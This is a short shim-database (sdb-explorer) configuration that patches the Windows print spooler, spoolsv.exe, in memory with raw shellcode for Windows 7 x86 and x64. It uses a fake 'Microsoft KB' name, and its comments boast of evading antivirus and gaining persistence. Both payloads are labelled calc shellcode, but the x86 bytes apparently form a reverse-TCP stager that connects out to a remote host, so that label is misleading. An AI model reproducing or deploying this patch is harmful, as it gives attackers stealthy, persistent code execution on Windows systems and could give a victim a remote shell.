# Spoolsv.exe Fix-it in-memory patch with shellcode, Architecture MATTERS!. The RVA is different for every windows OS and this has been deprecated in Win10+
# Create sdb files with sdb-explorer. the RVA for example (0x016b31) in Win7x86 is for the spoolsv!SPOOLER_main function.
# https://www.virustotal.com/#/file/64c440d5d6f4270ae85e6d23c15dfc8072f1eb52660f27bddf98c28375cd6555/detection (detections are cuz of shellcode, majority of AV vendors dont parse these. great for persistence)

!sdbpatch
APP=spoolsv.exe
DBNAME=Microsoft KB2881337

# Win7 x86 (calc shellcode)
P:spoolsv.exe
	R:spoolsv.exe,0x016b31,fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6833320000687773325f54684c772607ffd5b89001000029c454506829806b00ffd56a0a68ac100876680200115c89e6505050504050405068ea0fdfe0ffd5976a1056576899a57461ffd585c0740cff4e0875ec68f0b5a256ffd56a006a0456576802d9c85fffd58b366a406800100000566a006858a453e5ffd593536a005653576802d9c85fffd501c329c675eec3
!endsdbpatch

# Win7 x64 (calc shellcode)
P:spoolsv.exe
	R:spoolsv.exe,0x00f48c,fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbe01d2a0a41baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd563616c632e65786500
!endsdbpatch